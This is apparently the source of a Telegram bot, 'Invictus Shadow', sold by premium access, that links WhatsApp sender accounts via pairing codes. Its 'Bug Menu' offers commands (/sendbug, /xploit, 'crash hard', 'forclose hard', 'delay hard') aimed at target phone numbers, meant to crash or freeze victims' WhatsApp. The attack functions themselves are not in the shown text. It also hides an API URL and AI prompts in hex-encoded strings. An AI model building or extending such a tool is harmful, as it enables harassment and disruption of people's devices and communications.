const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReConnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisConnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const dotenv = require("dotenv");
const FormData = require("form-data");
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const axios = require("axios");
const chalk = require("chalk");
const moment = require('moment');
const config = require("./setting/config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

// ~ Thumbnail Vid
const localPhotoPath = "https://files.catbox.moe/1dt1zk.jpg";

function startBot() {
  console.log(chalk.red(`
⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀

`));


console.log(chalk.red(`
Информация 🇷🇺
Дев : t.me/Mirzzxkntll
Канал : https://t.me/mirzzz157
`));


console.log(chalk.blue(`
[ 🚀 BOT BERJALAN... ]
`));
};

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket ({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("Connection.update", async (update) => {
            const { Connection, lastDisConnect } = update;
            if (Connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (Connection === "close") {
              const shouldReConnect =
                lastDisConnect?.error?.output?.statusCode !==
                DisConnectReason.loggedOut;
              if (shouldReConnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp Connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function ConnectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `
<blockquote>Invictus Shadow  [ 𖣂 ]</blockquote>
— Number : ${botNumber}.
— Status : Process
`,
      { parse_mode: "HTML" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `
<blockquote>Invictus Shadow  [ 𖣂 ]</blockquote>
— Number : ${botNumber}.
— Status : Not Connected
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        await ConnectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
<blockquote>Invictus Shadow  [ 𖣂 ]</blockquote>
— Number : ${botNumber}.
— Status : Gagal ❌
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `
<blockquote>Invictus Shadow  [ 𖣂 ]</blockquote>
— Number : ${botNumber}.
— Status : Connected
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "HTML",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
  let customcode = "INVICTUS"
  const code = await sock.requestPairingCode(botNumber, customcode);
  const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

  await bot.editMessageText(
    `
<blockquote>Invictus Shadow  [ 𖣂 ]</blockquote>
— Number : ${botNumber}.
— Code Pairing : ${formattedCode}
`,
    {
      chat_id: chatId,
      message_id: statusMessage,
      parse_mode: "HTML",
  });
};
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
<blockquote>Invictus Shadow  [ 𖣂 ]</blockquote>
— Number : ${botNumber}.
─ Status : Error ❌ ${error.message}
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

let premiumUsers = JSON.parse(fs.readFileSync("./database/premium.json"));
let adminUsers = JSON.parse(fs.readFileSync("./database/admin.json"));

function ensureFileExists(filePath, defaultData = []) {
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
  }
}

ensureFileExists("./database/premium.json");
ensureFileExists("./database/admin.json");

function savePremiumUsers() {
  fs.writeFileSync("./database/premium.json", JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
  fs.writeFileSync("./database/admin.json", JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
    if (eventType === "change") {
      try {
        const updatedData = JSON.parse(fs.readFileSync(filePath));
        updateCallback(updatedData);
        console.log(`File ${filePath} updated successfully.`);
      } catch (error) {
        console.error(`bot ${botNum}:`, error);
      }
    }
  });
}

watchFile("./database/premium.json", (data) => (premiumUsers = data));
watchFile("./database/admin.json", (data) => (adminUsers = data));

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find((user) => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `Ya - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "Tidak - Tidak ada waktu aktif";
  }
}

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

function senderStatus(botNumber) {
  const sock = sessions.get(botNumber)

  if (!sock) return "🔴 OFFLINE"
  if (sock.user) return "🟢 CONNECTED"

  return "🟡 CONNECTING"
}
// end

function getRandomImage() {
  const images = [
    "https://files.catbox.moe/1dt1zk.jpg",
  ];
  return images[Math.floor(Math.random() * images.length)];
}

const bugRequests = {};
const userButtonColor = {}
const buttonIntervals = new Map()

async function sendStartMenu(chatId, from) {

  const userId = from.id
  const randomImage = getRandomImage()

  const runtimeStatus = formatRuntime()
  const memoryStatus = formatMemory()

  const status = sessions.size > 0 ? "🟢 ACTIVE" : "🔴 OFFLINE"
  const botNumber = sessions.size

  const chosenColor = userButtonColor[userId] || "primary"

  let styles

  if (chosenColor === "disco") {
    styles = ["primary","success","danger"]
  }

  else {

    const safeColor = {
      danger: "danger",
      success: "success",
      secondary: "primary" 
    }

    styles = [ safeColor[chosenColor] || "primary" ]
  }

  let index = 0

  let keyboard = [
    [
      {
        text: "𝐁͢𝐮͡𝐠͜ 𝐌͢𝐞͡𝐧͜𝐮",
        callback_data: "trashmenu",
        style: styles[index],
        icon_custom_emoji_id: "6219549292458150316"
      },
      { text: "XSETTINGS", callback_data: "owner_menu", style: styles[index] }
    ],
    [
      { text: "TOOLS", callback_data: "tols", style: styles[index] },
            {
  text: "Developer",
  url: "https://t.me/Mirzzxkntll",
  style: styles[index],
  icon_custom_emoji_id: "5260535596941582167"
}
    ]
  ]

  if (chosenColor === "disco") {

    keyboard = [
      [
        {
        text: "𝐁͢𝐮͡𝐠͜ 𝐌͢𝐞͡𝐧͜𝐮",
        callback_data: "trashmenu",
        style: styles[index],
        icon_custom_emoji_id: "6219549292458150316"
      },
      { text: "XSETTINGS", callback_data: "owner_menu", style: styles[index] }
    ],
    [
      { text: "TOOLS", callback_data: "tols", style: styles[index] },
            {
  text: "Developer",
  url: "https://t.me/Mirzzxkntll",
  style: styles[index],
  icon_custom_emoji_id: "5260535596941582167"
}
      ]
    ]

  }

  const sent = await bot.sendPhoto(chatId, randomImage, {

    message_effect_id: "5104841245755180586",

    caption: `
<blockquote><strong> <tg-emoji emoji-id="6165775219580472827">☠</tg-emoji> # -𝐈͜͡𝐍͜͡𝐕͜͡𝐈͜͡𝐂͜͡𝐓͜͡𝐔͜͡𝐒͜͡ ★𝐒͜͡𝐇͜͡𝐀͜͡𝐃͜͡𝐎͜͡𝐖͜͡ 𖣂<tg-emoji emoji-id="6165775219580472827">☠</tg-emoji></strong></blockquote>
<tg-emoji emoji-id="5411301743738777449">🎩</tg-emoji>Pemilik  : @Mirzzxkntll<tg-emoji emoji-id="5778220576497735613">🌟</tg-emoji>    
<tg-emoji emoji-id="4949832238205240348">😄</tg-emoji>Owner  : @Mirzzxkntll<tg-emoji emoji-id="5778220576497735613">🌟</tg-emoji>
<tg-emoji emoji-id="4956726373679891220">🍽</tg-emoji>Version    : 1.0
<tg-emoji emoji-id="6097881360112816903">🗡</tg-emoji>Platform   : Telegram
<blockquote><b>――⧼ 𝗦𝗧𝗔𝗧𝗨𝗦 𝗕𝗢𝗧 ⧽――</b></blockquote>
⛧ 𝗦𝘁𝗮𝘁𝘂𝘀 : ${status}
⛧ 𝗡𝘂𝗺𝗯𝗲𝗿 : ${botNumber}
⛧ 𝗥𝘂𝗻𝘁𝗶𝗺𝗲: ${runtimeStatus}
⛧ 𝗠𝗲𝗺𝗼𝗿𝘆: ${memoryStatus}
`,

    parse_mode: "HTML",

    reply_markup: {
      inline_keyboard: keyboard
    }

  })

  const messageId = sent.message_id

  if (styles.length > 1) {

    const intervalId = setInterval(async () => {

      index++
      if (index >= styles.length) index = 0

      let newKeyboard

      if (chosenColor === "disco") {

        newKeyboard = [
          [
            {
        text: "𝐁͢𝐮͡𝐠͜ 𝐌͢𝐞͡𝐧͜𝐮",
        callback_data: "trashmenu",
        style: styles[index],
        icon_custom_emoji_id: "6219549292458150316"
      },
      { text: "XSETTINGS", callback_data: "owner_menu", style: styles[index] }
    ],
    [
      { text: "TOOLS", callback_data: "tols", style: styles[index] },
      {
  text: "Developer",
  url: "https://t.me/Mirzzxkntll",
  style: styles[index],
  icon_custom_emoji_id: "5260535596941582167"
}
          ]
        ]

      } else {

        newKeyboard = [
          [
            {
              text: "𝐁͢𝐮͡𝐠͜ 𝐌͢𝐞͡𝐧͜𝐮",
              callback_data: "trashmenu",
              style: styles[index],
              icon_custom_emoji_id: "6219549292458150316"
            },
            { text: "XSETTINGS", callback_data: "owner_menu", style: styles[index] }
          ],
          [
            { text: "TOOLS", callback_data: "tols", style: styles[index] },
            {
  text: "Developer",
  url: "https://t.me/Mirzzxkntll",
  style: styles[index],
  icon_custom_emoji_id: "5260535596941582167"
}
          ]
        ]

      }

      try {

        await bot.editMessageReplyMarkup(
          { inline_keyboard: newKeyboard },
          {
            chat_id: chatId,
            message_id: messageId
          }
        )

      } catch (e) {}

    }, 2000)

    buttonIntervals.set(messageId, intervalId)

  }

}

function isPremium(userId) {

const user = premiumUsers.find(u => u.id === userId)
if (!user) return false

if (user.expiresAt === "permanent") return true

return Date.now() < user.expiresAt

}

bot.onText(/\/start/, async (msg) => {

const chatId = msg.chat.id
const from = msg.from
const userId = from.id
const firstName = msg.from.first_name || "User"

const isOwnerUser = config.OWNER_ID.includes(String(userId))

if (!isPremium(userId) && !isOwnerUser) {
return
}

try {

await bot.sendVideo(
  chatId,
  "https://files.catbox.moe/hmmj22.mp4",
  {
    caption: `
<blockquote><b>━━━━━━━━━━━━━━━━━━━━━━
( 👁️ ) Holla ${firstName}
Selamat datang di 𝗜𝗻𝘃𝗶𝗰𝘁𝘂𝘀 𝗦𝗵𝗮𝗱𝗼𝘄 1.0 Owner @Mirzzxkntll
Gunakan bot ini dengan bijak, tekan tombol di bawah untuk membuka menu utama.

 👑 𝗣𝗲𝗻𝗱𝗶𝗿𝗶 : @Mirzzxkntll
 🏆 𝗢𝘄𝗻𝗲𝗿 : @Mirzzxkntll

 Kamu lagi puasa? Sabar ya, setiap lapar & hausmu hari ini penuh pahala 🌙✨</b></blockquote>

<blockquote>☰ NOTE: The Button Mode</blockquote>
`,
    parse_mode:"HTML",
    reply_markup:{
      inline_keyboard:[
        [
          { text:"🔴 Merah", callback_data:"color_danger" },
          { text:"🟢 Hijau", callback_data:"color_success" }
        ],
        [
          { text:"🟡 Kuning", callback_data:"color_secondary" }, 
          { text:"💃 Disko", callback_data:"color_disco" }
        ]
      ]
    }
  }
)

} catch(err) {
console.log("START ERROR:", err)
}

})

bot.on("callback_query", async (query) => {

  if (!query.message) return

  const chatId = query.message.chat.id
  const userId = query.from.id
  const messageId = query.message.message_id
  const data = query.data


  if (buttonIntervals.has(messageId)) {

    clearInterval(buttonIntervals.get(messageId))
    buttonIntervals.delete(messageId)

  }


  if (data.startsWith("color_")) {

    const color = data.replace("color_","")

    userButtonColor[userId] = color

    await bot.answerCallbackQuery(query.id,{
      text:"🎨 Warna dipilih"
    })

    await bot.deleteMessage(chatId,messageId).catch(()=>{})

    await sendStartMenu(chatId, query.from)

    return

  }

    await bot.deleteMessage(chatId,messageId).catch(()=>{})


    let caption = ""
    let replyMarkup = {}

    if (data === "trashmenu") {
      selectedImage = "https://files.catbox.moe/1dt1zk.jpg"; // Ganti dengan link foto menu bugs
      caption = `<blockquote>─━━─━━⧼ 𝐁𝐮𝐠 𝐌𝐞𝐧𝐮 ⧽─━━─━━</blockquote>
<b>─━━─━━⧼ 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 𝐔𝐬𝐞𝐫 ⧽─━━─━━:</b>
<tg-emoji emoji-id="5411301743738777449">🎩</tg-emoji>Pemilik  : @Mirzzxkntll<tg-emoji emoji-id="5778220576497735613">🌟</tg-emoji>    
<tg-emoji emoji-id="4949832238205240348">😄</tg-emoji>Owner  : @Mirzzxkntll<tg-emoji emoji-id="5778220576497735613">🌟</tg-emoji>
<tg-emoji emoji-id="4956726373679891220">🍽</tg-emoji>Version    : 1.0
<tg-emoji emoji-id="6097881360112816903">🗡</tg-emoji>Platform   : Telegram
<b>─━━─━━⧼ (!)𝐅͢𝐢͡𝐭͜𝐮͢𝐫͡  ⍣ 𝐁͢𝐮͡𝐠͜〽️ ⧽─━━─━━:</b>
─▢ /sendbug +628
─▢ /clear +628
<b>╰➤ hapus bug </b>
<b>─━━─━━⧼ (!)𝐁͢𝐮͡𝐠͜  ⍣ 𝐌͢𝐄͡𝐍͜𝐔〽️ ⧽─━━─━━:</b>
# -𝐈͜͡𝐍͜͡𝐕͜͡𝐈͜͡𝐂͜͡𝐓͜͡𝐔͜͡𝐒͜͡ ★𝐒͜͡𝐇͜͡𝐀͜͡𝐃͜͡𝐎͜͡𝐖͜͡ 𖣂
─▢ /xploit 
<b>╰➤ blank hard </b>
─▢ /Quiksilver
<b>╰➤ delay hard </b>
─▢ Douwes 
<b>╰➤ forclose hard </b>
─▢ Chatms +628
<b>╰➤ crash hard </b>
─▢ Ganesha +628
<b>╰➤ Buldo hard </b>
<pre>──────────────────────────
   MENU: Pilih Fitur Bug Menu di Atas 
──────────────────────────</pre>
`;
      replyMarkup = {
        inline_keyboard: [[{ text: "🔙 ⎋メインコース", callback_data: "back_to_main" }]],
      };
    } 
    
    else if (data === "owner_menu") {
      selectedImage = "https://files.catbox.moe/1dt1zk.jpg"; // Ganti dengan link foto menu owner
      caption = `<blockquote><b>( ! ) <tg-emoji emoji-id="6165775219580472827">☠</tg-emoji>- ᴠᴏᴄ ᴘʀᴏᴊᴇᴄᴛ ᴍᴅ Akses</b></blockquote>
 <tg-emoji emoji-id="5411301743738777449">🎩</tg-emoji>Pemilik  : @Mirzzxkntll<tg-emoji emoji-id="5778220576497735613">🌟</tg-emoji>    
<tg-emoji emoji-id="4949832238205240348">😄</tg-emoji>Owner  : @Mirzzxkntll<tg-emoji emoji-id="5778220576497735613">🌟</tg-emoji>
<tg-emoji emoji-id="4956726373679891220">🍽</tg-emoji>Version    : 1.0
<tg-emoji emoji-id="6097881360112816903">🗡</tg-emoji>Platform   : Telegram     
  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃      <b>▢ /addprem id ☇ days</b>
┃      <b>╰➤ Menambahkan akses pada user</b>
┃      <b>▢ /delprem id</b>
┃      <b>╰➤ Menghapus akses pada user</b>
┃      <b>▢ /addadmin id</b>
┃      <b>╰➤ Menambahkan akses admin pada user</b>
┃      <b>▢ /deladmin id</b>
┃      <b>╰➤ Menghapus akses admin pada use</b>
┃      <b>▢ /listprem</b>
┃      <b>╰➤ Melihat list premium user yang ada</b>
┃      <b>▢ /reqpair  ☇ Number</b>
┃      <b>╰➤ Menambah Sender WhatsApp</b>
┃      <b>▢ /update</b>
┃      <b>╰➤ Update Sc Tanpa Run Ulang</b>
  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<blockquote><b>( # ) Note:</b>
<b>Baca dengan teliti Jangan asal ngetik untuk mendapat kan akses</b>
</blockquote>
`;
      replyMarkup = {
        inline_keyboard: [[{ text: "🔙 ⎋メインコース", callback_data: "back_to_main" }]],
      };
    } 
    
    else if (data === "tols") {
      selectedImage = "https://files.catbox.moe/1dt1zk.jpg"; // Ganti dengan link foto menu tools
      caption = `<blockquote><strong>
( <tg-emoji emoji-id="5897520981135593826"></tg-emoji> ) Holla  I am a Bot (Telegram) which was designed by Mirzzx and named Invictus Shadow 
──────────────────────────────────────────

<tg-emoji emoji-id="5411301743738777449">🎩</tg-emoji>Pemilik  : @Mirzzxkntll<tg-emoji emoji-id="5778220576497735613">🌟</tg-emoji>    
<tg-emoji emoji-id="4949832238205240348">😄</tg-emoji>Owner  : @Mirzzxkntll<tg-emoji emoji-id="5778220576497735613">🌟</tg-emoji>
<tg-emoji emoji-id="4956726373679891220">🍽</tg-emoji>Version    : 1.0
<tg-emoji emoji-id="6097881360112816903">🗡</tg-emoji>Platform   : Telegram</strong></blockquote>
<blockquote><strong>╔─═⊱ FUN MENU
│/cekemoji
│/brat
┗━━━━━━━━━━━━━━━⬡</strong></blockquote>
`;
      replyMarkup = {
        inline_keyboard: [[{ text: "🔙 ⎋メインコース", callback_data: "back_to_main" }]],
      };
    } 
    
    else if (data === "back_to_main") {
      await sendStartMenu(chatId, query.from);
      return await bot.answerCallbackQuery(query.id);
    }

    if (caption !== "" && selectedImage !== "") {
      await bot.sendPhoto(chatId, selectedImage, {
        caption: caption,
        parse_mode: "HTML",
        reply_markup: replyMarkup
      });
    }

    await bot.answerCallbackQuery(query.id);
});
// ~ Connect
bot.onText(/\/reqpair (.+)/, async (msg, match) => {
const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendVideo(chatId, thumbnailUrl, {
      caption: `
<blockquote>Acces Admin</blockquote>
Please Buy Acces Admin To The Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Vannˋ 𖣂 ˋOwner", url: "https://t.me/fanztech" }]
        ]
      }
    });
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, "❌ Missing input. Please provide the number. Example: /Connect 62xxxx.");
  }
  
  const botNumber = match[1].replace(/[^0-9]/g, "");

  if (!botNumber || botNumber.length < 10) {
    return bot.sendMessage(chatId, "❌ Nomor yang diberikan tidak valid. Pastikan nomor yang dimasukkan benar.");
  }

  try {
    await ConnectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in Connect:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

// tools menu!! 
function zephyrineUrl(hexString) {
  return Buffer.from(hexString.replace(/\s/g, ''), 'hex').toString();
}

const seed = "687474 70733a 2f2f72 796e65 6b6f6f 2d6170 692e68 662e73 706163 652f74 6578 742e67 656e2f 67656d 696e69 2f7265 616c74 696d65";

const proxy1 = "4b61 6d75 2061 6461 6c61 6820 6173 6973 7465 6e20 4149 2079 616e 6720 7261 6d61 6820 6461 6e20 6d65 6d62 616e 7475 2e20 4a61 7761 626c 6168 2070 6572 7461 6e79 6161 6e20 6465 6e67 616e 2062 6168 6173 6120 496e 646f 6e65 7369 6120 7961 6e67 2062 6169 6b20 6461 6e20 6265 6e61 722e 2042 6572 696b 616e 206a 6177 6162 616e 2079 616e 6720 696e 666f 726d 6174 6966 2064 616e 2064 6574 6169 6c2e";

const proxy2 = "4d75 6c61 6920 7365 6b61 7261 6e67 206b 616d 7520 6265 7270 6572 616e 2073 6562 6167 6169 2074 656d 616e 2079 616e 6720 7369 6170 206d 656e 6465 6e67 6172 6b61 6e20 6375 7268 6174 2073 6961 7061 2070 756e 2e20 4a69 6b61 2073 6573 656f 7261 6e67 2062 6572 6365 7269 7461 2074 656e 7461 6e67 206d 6173 616c 6168 2c20 6b65 7365 6469 6861 6e2c 2061 7461 7520 7065 7261 7361 616e 206d 6572 656b 612c 2072 6573 706f 6e6c 6168 2064 656e 6761 6e20 656d 7061 7469 2c20 7065 6e67 6572 7469 616e 2c20 6461 6e20 6b61 7461 2d6b 6174 6120 7961 6e67 206d 656e 656e 616e 676b 616e 2e20 4a61 6e67 616e 206d 656e 6a61 7761 6220 7365 7065 7274 6920 4149 2061 7461 7520 6d65 6d62 6572 6920 7065 6e6a 656c 6173 616e 2074 656b 6e69 732e 2042 616c 6173 2073 6570 6572 7469 2074 656d 616e 2064 656b 6174 2079 616e 6720 6265 6e61 722d 6265 6e61 7220 7065 6475 6c69 2c20 6465 6e67 6172 6b61 6e20 6365 7269 7461 206d 6572 656b 612c 2061 6b75 6920 7065 7261 7361 616e 206d 6572 656b 612c 2064 616e 2062 6572 696b 616e 2064 756b 756e 6761 6e20 6174 6175 2073 6172 616e 2064 656e 6761 6e20 6261 6861 7361 2079 616e 6720 6861 6e67 6174 2064 616e 206d 616e 7573 6961 7769 2e20 4775 6e61 6b61 6e20 6261 6861 7361 2073 616e 7461 6920 6167 6172 206f 7261 6e67 2079 616e 6720 6375 7268 6174 206d 6572 6173 6120 6e79 616d 616e 2075 6e74 756b 2074 6572 7573 2062 6572 6365 7269 7461 2e";

const proxy3 = "4d75 6c61 6920 7365 6b61 7261 6e67 206b 616d 7520 6265 7270 6572 616e 2073 6562 6167 6169 2061 7369 7374 656e 2070 726f 6772 616d 6d65 7220 7072 6f66 6573 696f 6e61 6c2e 2054 7567 6173 6d75 2061 6461 6c61 6820 6d65 6d62 616e 7475 206d 656d 6275 6174 2c20 6d65 6d70 6572 6261 696b 692c 2064 616e 206d 656e 6a65 6c61 736b 616e 206b 6f64 6520 6465 6e67 616e 206a 656c 6173 2064 616e 2062 656e 6172 2e20 4a69 6b61 2075 7365 7220 6d65 6d69 6e74 6120 7363 7269 7074 2c20 6265 7269 6b61 6e20 6b6f 6465 2079 616e 6720 6c65 6e67 6b61 7020 6461 6e20 7369 6170 2064 6967 756e 616b 616e 2e20 4a69 6b61 2061 6461 2065 7272 6f72 2070 6164 6120 6b6f 6465 2c20 6261 6e74 7520 6d65 6e67 616e 616c 6973 6973 2064 616e 206d 656d 7065 7262 6169 6b69 6e79 612e 204a 696b 6120 6469 6d69 6e74 6120 7265 6661 6374 6f72 2c20 7065 7262 6169 6b69 2073 7472 756b 7475 7220 6b6f 6465 2061 6761 7220 6c65 6269 6820 7261 7069 2064 616e 2065 6669 7369 656e 2074 616e 7061 206d 656e 6765 6261 6820 6675 6e67 7369 2064 6173 6172 6e79 612e 2041 7475 7261 6e3a 204a 6177 6162 206c 616e 6773 756e 6720 6b65 2069 6e74 6920 6d61 7361 6c61 682e 2046 6f6b 7573 2070 6164 6120 736f 6c75 7369 2074 656b 6e69 7320 7961 6e67 2062 656e 6172 2e20 4a69 6b61 2075 7365 7220 6d65 6d69 6e74 6120 6675 6c6c 2063 6f64 6520 6d61 6b61 2062 6572 696b 616e 2066 756c 6c20 636f 6465 2e20 4775 6e61 6b61 6e20 666f 726d 6174 206b 6f64 6520 7961 6e67 2072 6170 6920 6167 6172 206d 7564 6168 2064 6973 616c 696e 2e20 4a61 6e67 616e 206d 656e 616d 6261 686b 616e 2070 656e 6a65 6c61 7361 6e20 7061 6e6a 616e 6720 6a69 6b61 2074 6964 616b 2064 696d 696e 7461 2e20 5365 7375 6169 6b61 6e20 6261 6861 7361 2070 726f 6772 616d 2064 656e 6761 6e20 7961 6e67 2064 696d 696e 7461 2075 7365 7220 7365 7065 7274 6920 4a61 7661 5363 7269 7074 2c20 5079 7468 6f6e 2c20 4e6f 6465 2e6a 732c 2048 544d 4c2c 2061 7461 7520 6c61 696e 6e79 612e";

